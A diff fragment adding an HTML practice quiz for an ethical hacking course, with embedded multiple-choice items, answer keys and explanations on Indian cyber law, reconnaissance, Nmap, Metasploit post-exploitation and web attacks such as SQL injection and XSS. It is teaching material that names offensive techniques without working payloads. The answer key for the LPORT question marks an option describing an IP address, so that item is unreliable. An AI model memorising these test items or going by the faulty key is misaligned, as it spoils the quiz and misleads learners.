+          <strong id="unit2Score">-</strong>
+        </div>
+        <div class="cat-row">
+          <span>Unit III: Metasploit & Privilege Escalation</span>
+          <strong id="unit3Score">-</strong>
+        </div>
+        <div class="cat-row">
+          <span>Unit IV: Web App Pentesting & OWASP Top 10</span>
+          <strong id="unit4Score">-</strong>
+        </div>
+        <div class="cat-row">
+          <span>Unit V: Reporting, CVSS & Professional Practice</span>
+          <strong id="unit5Score">-</strong>
+        </div>
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn-nav primary" onclick="viewFullReview()">
+          <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          Review All Answers
+        </button>
+        <button class="btn-nav" onclick="retakeExam()">
+          <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+          Retake Quiz
+        </button>
+        <button class="btn-nav" onclick="closeModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Confirm Submit Modal -->
+  <div id="confirmModal" class="modal-overlay">
+    <div class="modal-card" style="max-width:460px; text-align:center;">
+      <h3 style="font-size:1.3rem; margin-bottom:12px;">Submit Examination?</h3>
+      <p id="confirmModalText" style="color:var(--text-secondary); margin-bottom:24px; font-size:0.95rem;">
+        You have answered 0 of 160 questions. Are you sure you want to finish the test and view your scorecard?
+      </p>
+      <div style="display:flex; gap:12px; justify-content:center;">
+        <button class="btn-nav primary" onclick="submitExamConfirmed()">Yes, Submit</button>
+        <button class="btn-nav" onclick="closeConfirmModal()">Keep Practicing</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Embedded Question Dataset and Logic -->
+  <script>
+    const QUESTIONS = [{"id": 1, "difficulty": "Simple", "unit": "Unit I", "topic": "Fundamentals of Ethical Hacking", "question": "What fundamental factor distinguishes an ethical hacker from a malicious black-hat hacker?", "options": ["The specific software tools and operating systems employed during the security testing", "Explicit written authorization from the system owner and lawful defensive intent", "The strict refusal to utilize automated vulnerability scanners during assessments", "The depth of technical programming knowledge and binary exploitation capability"], "answer": 1, "explanation": "Ethical hackers and malicious hackers use identical tools and skills. What legally and morally distinguishes ethical hacking is explicit written permission from the asset owner and lawful, defensive intent."}, {"id": 2, "difficulty": "Simple", "unit": "Unit I", "topic": "Hacker Archetypes", "question": "Which category of hacker identifies security vulnerabilities without prior authorization but reports them without malicious intent, often seeking a bounty or acknowledgment?", "options": ["Script Kiddie", "Grey Hat Hacker", "Nation-State Actor", "Black Hat Hacker"], "answer": 1, "explanation": "Grey Hat hackers operate in an ambiguous legal territory: they discover vulnerabilities without explicit prior permission (violating authorization boundaries) but disclose them rather than exploiting them destructively."}, {"id": 3, "difficulty": "Simple", "unit": "Unit I", "topic": "Hacker Archetypes", "question": "How is a 'Script Kiddie' primarily characterized in cybersecurity taxonomy?", "options": ["An unskilled person using pre-made scripts without understanding how they work", "A certified penetration tester performing compliance audits against ISO standards", "An experienced security researcher writing custom zero-day exploits in assembly code", "A government intelligence contractor conducting long-term stealth cyber espionage"], "answer": 0, "explanation": "Script Kiddies are low-skilled individuals who execute pre-packaged attack scripts and automated tools written by others without truly understanding the protocol mechanisms or exploit payloads."}, {"id": 4, "difficulty": "Simple", "unit": "Unit I", "topic": "Hacker Archetypes", "question": "What is the primary driving motivation behind hacktivist groups such as Anonymous?", "options": ["Conducting structured quarterly penetration tests under client enterprise contracts", "Achieving formal cybersecurity compliance certifications like PCI-DSS and HIPAA", "Advancing political, social, or ideological causes through digital disruption", "Generating direct financial profits through commercial ransomware extortion schemes"], "answer": 2, "explanation": "Hacktivists use hacking techniques (website defacements, DoS, data leaks) to promote political agendas, protest social injustice, or advocate ideological viewpoints rather than personal financial gain."}, {"id": 5, "difficulty": "Simple", "unit": "Unit I", "topic": "Hacker Archetypes", "question": "What term describes state-sponsored hacking groups that conduct prolonged, covert cyber espionage campaigns against critical national infrastructure?", "options": ["Script Kiddie Hacking Collectives", "Open Source Intelligence Syndicates", "Automated Global Botnet Fleets", "Advanced Persistent Threats (APTs)"], "answer": 3, "explanation": "Nation-State actors and Advanced Persistent Threats (APTs) are highly funded, disciplined teams that maintain covert, long-term footholds inside strategic targets for espionage or sabotage."}, {"id": 6, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "Under Section 43 of the Indian Information Technology Act 2000, what is the consequence of unauthorized downloading, copying, or extracting of data from a computer system?", "options": ["Mandatory lifetime blacklisting from government software procurement contracts", "Automatic transfer of the case to international intellectual property arbitration", "Liability to pay compensation by way of damages to the affected person", "Immediate forfeiture of personal computing hardware without civil recourse"], "answer": 2, "explanation": "Section 43 of the IT Act 2000 establishes civil liability, requiring the unauthorized actor to pay compensation to the affected system owner for damage, data copying, extraction, or disruption."}, {"id": 7, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "Which section of the IT Act 2000 criminalizes the intentional concealment, destruction, or alteration of computer source code?", "options": ["Section 70", "Section 66B", "Section 43A", "Section 65"], "answer": 3, "explanation": "Section 65 specifically penalizes tampering with computer source documents with imprisonment up to three years, or with a fine up to two lakh rupees, or both."}, {"id": 8, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "What legal element converts an unauthorized civil violation under Section 43 into a criminal offence under Section 66 of the IT Act 2000?", "options": ["Performing network scans between midnight and six in the morning", "Committing the act dishonestly or fraudulently (mens rea)", "Using an open-source Linux distribution instead of commercial software", "Exceeding an aggregate data transmission rate of one gigabit per second"], "answer": 1, "explanation": "Section 66 criminalizes actions listed under Section 43 if done dishonestly or fraudulently, imposing imprisonment up to three years, or a fine up to five lakh rupees, or both."}, {"id": 9, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "Which section of the IT Act 2000 penalizes identity theft involving the fraudulent use of another person's electronic signature, password, or unique identification feature?", "options": ["Section 69A", "Section 65", "Section 66C", "Section 43"], "answer": 2, "explanation": "Section 66C prescribes punishment for identity theft (fraudulently using another person's password, digital signature, or biometric credentials) with imprisonment up to 3 years and a fine up to 1 lakh."}, {"id": 10, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "What is the maximum penalty prescribed under Section 66F of the IT Act 2000 for acts constituting cyber terrorism against the sovereignty or security of India?", "options": ["Imprisonment up to three years and a fine of five lakh rupees", "A financial civil penalty strictly limited to twenty-five lakh rupees", "Imprisonment for life", "Community service and supervised cybersecurity remediation training"], "answer": 2, "explanation": "Section 66F is among the most severe criminal provisions under Indian cyber law, punishing acts of cyber terrorism against national security or critical infrastructure with imprisonment for life."}, {"id": 11, "difficulty": "Simple", "unit": "Unit I", "topic": "Legal Framework - IT Act 2000", "question": "Under Section 70 of the IT Act 2000, what constitutes a 'Protected System'?", "options": ["Any corporate laptop operating an active commercial antivirus subscription", "Computer systems declared by the government as Critical Information Infrastructure", "A standard consumer home router configured with WPA2-Personal security", "Any cloud storage bucket protected by multi-factor authentication"], "answer": 1, "explanation": "Section 70 empowers the Government to declare any computer system impacting Critical Information Infrastructure (CII) as a Protected System; unauthorized access is punishable by up to 10 years imprisonment."}, {"id": 12, "difficulty": "Simple", "unit": "Unit I", "topic": "Cybersecurity Governance", "question": "Which national statutory agency functions as the national nodal agency for incident response under Section 70B of the IT Act 2000?", "options": ["Data Protection Board of India", "CERT-In (Indian Computer Emergency Response Team)", "NCIIPC (National Critical Information Infrastructure Protection Centre)", "Central Bureau of Investigation Cyber Wing"], "answer": 1, "explanation": "Section 70B establishes CERT-In as the national agency responsible for incident response, vulnerability reporting, and coordinating cybersecurity defenses across India."}, {"id": 13, "difficulty": "Simple", "unit": "Unit I", "topic": "Rules of Engagement & Authorization", "question": "What is the fundamental purpose of the Rules of Engagement (RoE) document in a penetration testing contract?", "options": ["Granting unconditional immunity to conduct attacks against third-party partner vendors", "Defining authorized scope, operational timeframes, contacts, and prohibited techniques", "Transferring intellectual property ownership of client source code to the consultant", "Replacing all executive summary findings with automated vulnerability scanner outputs"], "answer": 1, "explanation": "The Rules of Engagement (RoE) establishes the operational boundaries: IP ranges, allowed and prohibited testing methods (e.g., no DoS), test hours, escalation procedures, and emergency contacts."}, {"id": 14, "difficulty": "Simple", "unit": "Unit I", "topic": "Rules of Engagement & Authorization", "question": "Why is a Non-Disclosure Agreement (NDA) executed before beginning an ethical hacking engagement?", "options": ["To exempt the client organization from complying with national data protection laws", "To mandate that only proprietary commercial testing tools are used in the audit", "To permit testers to release exploit proofs-of-concept on public social media forums", "To obligate testers to protect client vulnerabilities and proprietary business data"], "answer": 3, "explanation": "An NDA legally binds the penetration testing team to maintain complete confidentiality regarding client systems, sensitive corporate data, credentials, and identified vulnerabilities."}, {"id": 15, "difficulty": "Simple", "unit": "Unit I", "topic": "Phases of Ethical Hacking", "question": "What is the correct sequential order of the five standard phases of ethical hacking?", "options": ["Reconnaissance, Scanning, Gaining Access, Maintaining Access, Covering Tracks", "Scanning & Enumeration, Gaining Access, Reconnaissance, Maintaining Access, Pivoting", "Covering Tracks, Gaining Access, Scanning & Enumeration, Reconnaissance, Reporting", "Reconnaissance, Maintaining Access, Gaining Access, Scanning & Enumeration, Reporting"], "answer": 0, "explanation": "The 5 standard phases of ethical hacking are: 1. Reconnaissance, 2. Scanning & Enumeration, 3. Gaining Access (Exploitation), 4. Maintaining Access (Persistence), 5. Covering Tracks / Reporting."}, {"id": 16, "difficulty": "Simple", "unit": "Unit I", "topic": "Cyber Kill Chain", "question": "Which defense contractor developed the 'Cyber Kill Chain' framework to model adversary intrusion steps?", "options": ["Northrop Grumman", "General Dynamics", "Lockheed Martin", "Raytheon Intelligence"], "answer": 2, "explanation": "Lockheed Martin developed the Cyber Kill Chain framework (Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives) to assist defenders in disrupting attacks."}, {"id": 17, "difficulty": "Simple", "unit": "Unit I", "topic": "Security Team Roles", "question": "In an enterprise security exercise, what is the core responsibility of the Red Team?", "options": ["Configuring firewall access control lists and monitoring real-time SIEM alerts", "Auditing user workstations to ensure compliant desktop wallpapers and screen-savers", "Drafting annual corporate financial expenditure reports for regulatory bodies", "Simulating real adversary attacks to find and exploit organizational weaknesses"], "answer": 3, "explanation": "The Red Team plays the offensive adversary role, simulating realistic cyber-attacks against people, processes, and technology to evaluate organizational defense efficacy."}, {"id": 18, "difficulty": "Simple", "unit": "Unit I", "topic": "Security Team Roles", "question": "What is the primary function of a 'Purple Team' in modern cybersecurity operations?", "options": ["Enabling joint Red and Blue team collaboration to test and improve detections", "Conducting physical facility penetration testing against biometric door locks", "Managing enterprise data backup tapes in off-site temperature-controlled storage", "Operating an autonomous bug bounty marketplace for independent contractors"], "answer": 0, "explanation": "A Purple Team brings Red (offensive) and Blue (defensive) teams together to test specific attack techniques in real time and immediately verify and improve detection rules."}, {"id": 19, "difficulty": "Simple", "unit": "Unit I", "topic": "VAPT vs Penetration Testing", "question": "What core operational difference separates a Vulnerability Assessment from a Penetration Test?", "options": ["Penetration testing only reviews source code, while vulnerability assessment reviews network cables", "Vulnerability assessments are exclusively manual, while penetration tests are fully automated", "Vulnerability assessment finds potential flaws; penetration testing exploits them", "Vulnerability assessments require root access, while penetration tests never require passwords"], "answer": 2, "explanation": "A Vulnerability Assessment (VA) discovers and catalogues known potential weaknesses. A Penetration Test (PT) actively exploits them to determine actual risk, depth of access, and business impact."}, {"id": 20, "difficulty": "Simple", "unit": "Unit I", "topic": "Testing Standards", "question": "What does the industry acronym 'PTES' represent in penetration testing methodology?", "options": ["Penetration Testing Execution Standard", "Perimeter Threat Elimination Schema", "Protocol Transport Encryption Standard", "Packet Transmission Evaluation System"], "answer": 0, "explanation": "PTES stands for the Penetration Testing Execution Standard, which defines seven distinct phases of a complete, professional penetration testing engagement."}, {"id": 21, "difficulty": "Simple", "unit": "Unit I", "topic": "Lab Environments", "question": "Why are intentionally vulnerable virtual machines like Metasploitable 2 placed on an isolated 'Host-Only' virtual network?", "options": ["To allow the vulnerable virtual machine to automatically download security updates", "To bypass modern operating system hardware virtualization features like VT-x", "To maximize the transmission speed of brute-force dictionary attacks across subnets", "To isolate intentionally vulnerable services from the local network and Internet"], "answer": 3, "explanation": "Metasploitable 2 contains critical remote vulnerabilities. A Host-Only network confines all traffic strictly between the host and VMs, preventing accidental external exposure or compromise."}, {"id": 22, "difficulty": "Simple", "unit": "Unit II", "topic": "Passive Reconnaissance", "question": "Which activity represents an example of purely passive reconnaissance?", "options": ["Connecting to an organization's SSH service on port 22 to capture the service banner", "Searching public DNS records, WHOIS databases, and search engine cache", "Executing an aggressive Nmap SYN port scan against an enterprise perimeter firewall", "Submitting SQL injection payloads into an administrative web login form"], "answer": 1, "explanation": "Passive reconnaissance gathers publicly available intelligence without sending any network packets directly to the target organization's infrastructure."}, {"id": 23, "difficulty": "Simple", "unit": "Unit II", "topic": "Google Dorking", "question": "Which Google search operator restricts search results strictly to a designated domain or website?", "options": ["filetype:", "inurl:", "site:", "intitle:"], "answer": 2, "explanation": "The 'site:' operator limits search engine results strictly to web pages hosted under the specified domain (e.g., site:target.com)."}, {"id": 24, "difficulty": "Simple", "unit": "Unit II", "topic": "Google Dorking", "question": "Which Google search query specifically filters for publicly exposed Excel spreadsheets containing employee data on a domain?", "options": ["site:example.com filetype:xlsx employee", "host:example.com format:sheet employee", "domain:example.com type:excel employee", "target:example.com doc:xls employee"], "answer": 0, "explanation": "Combining 'site:example.com' with 'filetype:xlsx' (or 'filetype:xls') specifically targets exposed spreadsheet files on the target domain."}, {"id": 25, "difficulty": "Simple", "unit": "Unit II", "topic": "WHOIS Reconnaissance", "question": "What information is commonly retrieved by running a WHOIS query against a corporate domain name?", "options": ["The private RSA encryption keys securing the domain's wildcard SSL certificate", "The active database session tokens of authenticated enterprise portal administrators", "The internal plaintext /etc/shadow password hashes of the company web servers", "Domain registrar details, creation and expiry dates, and authoritative nameservers"], "answer": 3, "explanation": "WHOIS queries provide public domain registration records, including the sponsoring registrar, registration dates, contact details (if unmasked), and authoritative name servers."}, {"id": 26, "difficulty": "Simple", "unit": "Unit II", "topic": "DNS Record Types", "question": "Which DNS record type designates the primary mail servers responsible for handling email for a domain?", "options": ["A", "SOA", "PTR", "MX"], "answer": 3, "explanation": "MX (Mail Exchanger) records specify the mail servers authorized to accept incoming emails on behalf of the domain."}, {"id": 27, "difficulty": "Simple", "unit": "Unit II", "topic": "OSINT Tools - Shodan", "question": "How does Shodan differ fundamentally from conventional search engines like Google or Bing?", "options": ["Shodan provides automated exploit payloads to immediately compromise Windows endpoints", "Shodan only indexes websites that have purchased commercial digital certificates", "Shodan indexes connected devices, ports, and service banners rather than web pages", "Shodan is exclusively restricted to law enforcement agencies and cannot be accessed publicly"], "answer": 2, "explanation": "Unlike web search engines that crawl HTML hypertext, Shodan continuously scans the entire IPv4 space, indexing banners returned by open ports on routers, servers, webcams, and IoT devices."}, {"id": 28, "difficulty": "Simple", "unit": "Unit II", "topic": "OSINT Tools - theHarvester", "question": "What is the primary function of the open-source OSINT tool 'theHarvester' during reconnaissance?", "options": ["Harvesting target emails, employee names, subdomains, and IP addresses", "Performing automated SQL injection exploitation against backend database engines", "Decrypting WPA2 Wi-Fi handshakes using local graphics processing units", "Generating encrypted Metasploit shellcode to bypass host antivirus scanners"], "answer": 0, "explanation": "theHarvester gathers emails, names, subdomains, IPs, and URLs from various public search engines, PGP key servers, and Shodan to build a comprehensive target profile."}, {"id": 29, "difficulty": "Simple", "unit": "Unit II", "topic": "Active Reconnaissance - Banner Grabbing", "question": "Which command-line utility is standardly used by penetration testers to perform quick manual banner grabbing on a remote service port?", "options": ["John the Ripper", "Hashcat", "Netcat (nc)", "Wireshark"], "answer": 2, "explanation": "Netcat (nc) establishes raw TCP/UDP connections to target ports (e.g., nc -vn <IP> <port>), allowing testers to inspect service welcome banners and version strings."}, {"id": 30, "difficulty": "Simple", "unit": "Unit III", "topic": "Metasploit Architecture", "question": "In the Metasploit Framework, which module category is used to perform scanning, port verification, and enumeration without deploying an exploit payload?", "options": ["Auxiliary", "Encoder Ensembles", "Payload Generators", "Exploit Modules"], "answer": 0, "explanation": "Auxiliary modules perform supplementary tasks such as port scanning, service enumeration, fingerprinting, and denial of service checks without firing an exploit payload."}, {"id": 31, "difficulty": "Simple", "unit": "Unit III", "topic": "msfconsole Commands", "question": "Which msfconsole command is used to select and load an exploit or auxiliary module into the active workspace?", "options": ["load", "select", "run", "use"], "answer": 3, "explanation": "The 'use' command loads a specific module into the active msfconsole context (e.g., use exploit/unix/ftp/vsftpd_234_backdoor)."}, {"id": 32, "difficulty": "Simple", "unit": "Unit III", "topic": "Metasploit Variables", "question": "When configuring a reverse TCP payload in Metasploit, what does the 'LPORT' variable designate?", "options": ["The default administrative gateway port of the client organization's firewall", "The attacker machine's IP address configured to receive the reverse connection", "The authoritative DNS nameserver assigned to the target company", "The remote service port targeted on the victim machine during initial exploitation"], "answer": 1, "explanation": "LPORT (Local Port) specifies the port on the attacker's system where the multi/handler listener waits to accept the incoming reverse shell connection."}, {"id": 33, "difficulty": "Simple", "unit": "Unit IV", "topic": "OWASP Top 10", "question": "According to the OWASP Top 10 (2021), which vulnerability category occupies the number one (A01) position?", "options": ["Cryptographic Failures", "Broken Access Control", "Injection", "Security Misconfiguration"], "answer": 1, "explanation": "A01:2021 is Broken Access Control, representing failures that allow authenticated or unauthenticated users to access unauthorized resources, data, or privileges."}, {"id": 34, "difficulty": "Simple", "unit": "Unit IV", "topic": "Burp Suite Architecture", "question": "What is the default loopback IP address and port where Burp Suite Community Edition listens for proxy traffic?", "options": ["127.0.0.1:8080", "127.0.0.1:3306", "10.0.0.1:443", "192.168.1.1:80"], "answer": 0, "explanation": "By default, Burp Suite sets its local HTTP proxy listener to 127.0.0.1 on port 8080."}, {"id": 35, "difficulty": "Simple", "unit": "Unit V", "topic": "VAPT Reporting & Severity", "question": "In a formal VAPT report, who is the primary target audience for the Executive Summary?", "options": ["Executive leadership and managers focused on business risk and governance", "Junior software developers seeking exact source code line patches and compiler flags", "Network engineers needing specific Wireshark packet filter strings for intrusion detection", "System administrators requiring step-by-step Linux command syntax to harden daemons"], "answer": 0, "explanation": "The Executive Summary is a non-technical, high-level overview written for business executives and board members, summarizing overall business risk, major findings, and strategic remediation priorities."}, {"id": 36, "difficulty": "Medium", "unit": "Unit II", "topic": "Active Reconnaissance - Nmap Scan Types", "question": "What is the primary operational difference between an Nmap TCP SYN scan (-sS) and a TCP Connect scan (-sT)?", "options": ["SYN scan can only identify closed ports; Connect scan can only identify open ports on firewalls", "SYN scan requires no administrative privileges; Connect scan strictly requires root permissions", "SYN scan transmits ICMP echo packets; Connect scan exclusively transmits UDP datagram probes", "SYN scan resets after SYN-ACK (half-open); Connect scan finishes the 3-way handshake"], "answer": 3, "explanation": "Nmap -sS sends a SYN packet; if SYN-ACK is received, it responds with RST to avoid completing the connection (half-open scan, requiring root). In contrast, -sT uses the OS system call to complete the full 3-way handshake (SYN, SYN-ACK, ACK)."}, {"id": 37, "difficulty": "Medium", "unit": "Unit II", "topic": "Active Reconnaissance - Stealth Scans", "question": "Why do Nmap stealth scans (NULL -sN, FIN -sF, and Xmas -sX) reliably determine open ports on RFC 793-compliant Unix systems but fail on Windows systems?", "options": ["RFC 793 says closed ports reply with RST while open drop; Windows replies RST to all", "Windows drops all incoming TCP packets that do not include a valid Microsoft signature", "Unix systems disable routing whenever a packet with invalid TCP header flags appears", "Nmap blocks transmission of FIN packets to target IPs identified as Windows hosts"], "answer": 0, "explanation": "According to RFC 793, any packet without SYN, ACK, or RST sent to an open port should be dropped (no response), while a closed port sends RST. Windows does not follow this rule and replies with RST to all ports, making them all appear closed."}, {"id": 38, "difficulty": "Medium", "unit": "Unit III", "topic": "Payload Engineering", "question": "In the Metasploit Framework, what distinguishes a staged payload (e.g., windows/meterpreter/reverse_tcp) from a stageless payload (e.g., windows/shell_reverse_tcp)?", "options": ["Staged sends a small stager to fetch the payload; stageless is fully self-contained", "Staged payloads target 32-bit Linux systems; stageless payloads only target 64-bit hosts", "Staged payloads execute without network sockets; stageless payloads need multiple ports", "Staged payloads bypass all antivirus software; stageless payloads are flagged immediately"], "answer": 0, "explanation": "Staged payloads use a small 'stager' stub designed to fit in restricted buffer space, which then establishes a connection to download the full payload (like Meterpreter). Stageless payloads contain all exploit code in one monolithic binary."}, {"id": 39, "difficulty": "Medium", "unit": "Unit II", "topic": "DNS Enumeration & Zone Transfers", "question": "What transport layer protocol and port number are standardly utilized when performing a full DNS Zone Transfer (AXFR)?", "options": ["UDP port 67", "TCP port 80", "TCP port 53", "UDP port 53"], "answer": 2, "explanation": "While standard single DNS queries use UDP port 53 for speed, DNS Zone Transfers (AXFR/IXFR) involve reliable transmission of large datasets and therefore use TCP port 53."}, {"id": 40, "difficulty": "Medium", "unit": "Unit II", "topic": "Network Enumeration - SMB", "question": "When performing network enumeration on Windows/SMB services, what is the functional difference between port 139 and port 445?", "options": ["Port 139 is an unprivileged UDP port; port 445 is a high-speed raw IP tunnel interface", "Port 139 supports encrypted SMBv3; port 445 only supports unencrypted SMBv1 traffic", "Port 139 runs SMB over NetBIOS Session Service; port 445 runs SMB direct over TCP", "Port 139 connects to Active Directory LDAP; port 445 connects to the Kerberos KDC"], "answer": 2, "explanation": "Port 139 was historically used for SMB encapsulated in NetBIOS over TCP/IP (NetBIOS-SSN). Starting with Windows 2000, Microsoft introduced direct SMB hosting over raw TCP on port 445 without needing NetBIOS."}, {"id": 41, "difficulty": "Medium", "unit": "Unit II", "topic": "Network Enumeration - enum4linux", "question": "What underlying utilities does the enum4linux tool wrap to automate Windows and Samba information gathering?", "options": ["nikto, dirb, gobuster, and sqlmap", "hydra, john, hashcat, and medusa", "smbclient, rpcclient, net, and nmblookup", "tcpdump, wireshark, ettercap, and snort"], "answer": 2, "explanation": "enum4linux is a Perl wrapper script that automates queries against SMB/Samba systems by calling Samba client binaries: smbclient, rpcclient, net, and nmblookup."}, {"id": 42, "difficulty": "Medium", "unit": "Unit II", "topic": "Network Enumeration - SNMP", "question": "Which UDP port is polled when querying an SNMP agent using an SNMP walk, and what default read-only community string is frequently found misconfigured?", "options": ["UDP port 161, with community string 'public'", "UDP port 162, with community string 'admin'", "TCP port 161, with community string 'root'", "TCP port 162, with community string 'system'"], "answer": 0, "explanation": "SNMP agents listen for polling requests on UDP port 161 (UDP 162 is for asynchronous SNMP Traps). The most common default read-only community string is 'public'."}, {"id": 43, "difficulty": "Medium", "unit": "Unit II", "topic": "Network Enumeration - SMTP", "question": "Which two standard SMTP commands can an ethical hacker test to enumerate valid user accounts on a mail server?", "options": ["MAIL FROM and RCPT TO", "HELO and QUIT", "STARTTLS and AUTH", "VRFY and EXPN"], "answer": 3, "explanation": "The SMTP VRFY command asks the server to verify whether a specific user exists, and EXPN expands a mailing list. If not disabled, attackers can query lists of common usernames to see which ones are valid."}, {"id": 44, "difficulty": "Medium", "unit": "Unit II", "topic": "Active Reconnaissance - Nmap Timing", "question": "What is the primary difference between Nmap timing template T3 and timing template T4?", "options": ["T3 scans only ports below 1024; T4 scans all 65,535 TCP ports simultaneously in parallel", "T3 uses normal default timing; T4 accelerates scans by lowering probe timeouts", "T3 routes probes through anonymous Tor proxies; T4 sends packets over unencrypted links", "T3 is invisible to intrusion detection; T4 triggers immediate kernel panic shutdowns"], "answer": 1, "explanation": "T3 (Normal) is Nmap's default timing. T4 (Aggressive) speeds up the scan significantly by assuming a reasonably fast and reliable network, capping probe round-trip timeouts to under 1.25 seconds."}, {"id": 45, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Penetration Testing - SQLi", "question": "What is the key functional distinction between Error-Based SQL Injection and UNION-Based SQL Injection?", "options": ["Error-based extracts data via error outputs; UNION-based appends to the query result", "Error-based works only on Oracle databases; UNION-based works only on SQLite databases", "Error-based requires root credentials; UNION-based executes without any HTTP parameters", "Error-based alters database schemas; UNION-based only generates temporary client cookies"], "answer": 0, "explanation": "Error-based SQLi forces the database to generate an error containing the sensitive data (e.g., via type conversion). UNION-based SQLi attaches a second SELECT statement to combine query results into the rendered page response."}, {"id": 46, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Penetration Testing - SQLi", "question": "Why does a tester inject sequential clauses like 'ORDER BY 1', 'ORDER BY 2', 'ORDER BY 3' prior to executing a UNION SELECT injection?", "options": ["To bypass web application firewall filters inspecting single-quote characters", "To sort database records in descending order for faster dictionary hash cracking", "To determine the query's column count so the UNION query matches", "To force the backend database engine to commit all pending transactional updates"], "answer": 2, "explanation": "A UNION SELECT statement will fail with a syntax or column mismatch error unless the injected query contains the exact same number of columns and compatible data types as the original query."}, {"id": 47, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Penetration Testing - XSS", "question": "How does Reflected Cross-Site Scripting (Reflected XSS) differ from Stored Cross-Site Scripting (Stored XSS)?", "options": ["Reflected executes in PHP engines; Stored executes exclusively inside database engines", "Reflected is non-persistent via a link; Stored persists in the application database", "Reflected requires administrator logins; Stored can only affect unauthenticated guests", "Reflected executes in web server memory; Stored executes on client network switches"], "answer": 1, "explanation": "Reflected XSS reflects the malicious script off the web server in an immediate HTTP response (e.g., search error), requiring a victim to click a malicious link. Stored XSS is stored in the database and executes for anyone viewing the page."}, {"id": 48, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Penetration Testing - XSS", "question": "What is the defining attribute of a DOM-based Cross-Site Scripting (DOM XSS) vulnerability?", "options": ["The payload bypasses browser execution entirely by running inside the DNS cache", "The payload requires physical hardware keyloggers attached to the victim machine", "The payload permanently rewrites Apache server configuration files upon execution", "The payload executes client-side in the DOM without server-side reflection"], "answer": 3, "explanation": "In DOM-based XSS, the vulnerability exists entirely in client-side code where unsafe input from a source (e.g., location.hash) flows into an execution sink (e.g., document.write or innerHTML) without server involvement."}, {"id": 49, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Security - Cookies", "question": "What exact defensive protection does the 'HttpOnly' flag provide when appended to a session cookie header?", "options": ["It mandates that cookies can only travel across dedicated high-speed optical backbones", "It encrypts the entire HTTP payload using AES-256 before transmitting data to the host", "It prevents web application firewalls from inspecting user HTTP request header fields", "It blocks client scripts from accessing cookies via document.cookie, stopping theft"], "answer": 3, "explanation": "The HttpOnly flag directs the browser that the cookie should not be accessible via client-side scripts (such as document.cookie), effectively neutralizing cookie theft via Cross-Site Scripting attacks."}, {"id": 50, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Security - Headers", "question": "How does a Content Security Policy (CSP) header strengthen web application resilience against Cross-Site Scripting?", "options": ["It continuously scans the client hard drive for malicious executable files and trojans", "It compiles HTML markup into encrypted binary bytecode before delivering it to clients", "It restricts allowed script sources and blocks inline script execution by default", "It automatically blocks incoming HTTP POST requests not originating from search bots"], "answer": 2, "explanation": "A robust Content Security Policy (CSP) restricts where scripts can be loaded from (e.g., script-src 'self') and prohibits inline scripts (<script>alert(1)<\/script>) and eval(), mitigating XSS exploitation."}, {"id": 51, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Penetration Testing - CSRF", "question": "What browser mechanism makes Cross-Site Request Forgery (CSRF) possible?", "options": ["Browsers automatically send stored session credentials with cross-origin requests", "Operating systems disable memory layout randomization when processing web sockets", "Web servers share session database connection pools directly across domains", "Browsers execute cross-origin JavaScript files inside elevated OS kernel rings"], "answer": 0, "explanation": "CSRF exploits the fact that browsers automatically attach stored session cookies and HTTP authentication credentials whenever making a request to a target domain, even when triggered by a malicious third-party site."}, {"id": 52, "difficulty": "Medium", "unit": "Unit IV", "topic": "Web Application Security - CSRF", "question": "What is the primary technical requirement for an effective Anti-CSRF token defense?", "options": ["It must be unpredictable, tied to the user session, and validated server-side", "It must remain constant across all registered users on the web application for a year", "It must be derived strictly from the client machine's public IPv4 gateway address", "It must be stored in a publicly accessible cookie without encryption or expiration"], "answer": 0, "explanation": "Effective CSRF defense requires an unpredictable, cryptographically strong token tied to the current user's session. The server validates that the token in the form/header matches the expected session token before processing state changes."}, {"id": 53, "difficulty": "Medium", "unit": "Unit III", "topic": "Post-Exploitation - Meterpreter", "question": "In a Meterpreter session, why does an attacker execute the 'migrate' command to inject into a different process like explorer.exe?", "options": ["To convert the target system into an authoritative DNS root nameserver on the Internet", "To evade network firewall stateful packet filtering rules on outgoing TCP port 80", "To decrypt all encrypted BitLocker volumes on the target Windows system automatically", "To maintain persistence if the initially exploited process crashes or terminates"], "answer": 3, "explanation": "Initial exploitation often occurs in an unstable or temporary process (e.g., a browser tab or vulnerable daemon). Migrating into a stable, persistent process like explorer.exe or svchost.exe ensures the shell survives."}, {"id": 54, "difficulty": "Medium", "unit": "Unit III", "topic": "Post-Exploitation - Meterpreter", "question": "What privilege level is strictly required on a target Windows host to execute the Meterpreter 'hashdump' command successfully?", "options": ["Any basic remote desktop terminal service user", "Standard unprivileged Domain Guest access", "Read-only anonymous SMB null-session access", "NT AUTHORITY\\SYSTEM or local administrative privileges"], "answer": 3, "explanation": "The hashdump command accesses the Windows Security Account Manager 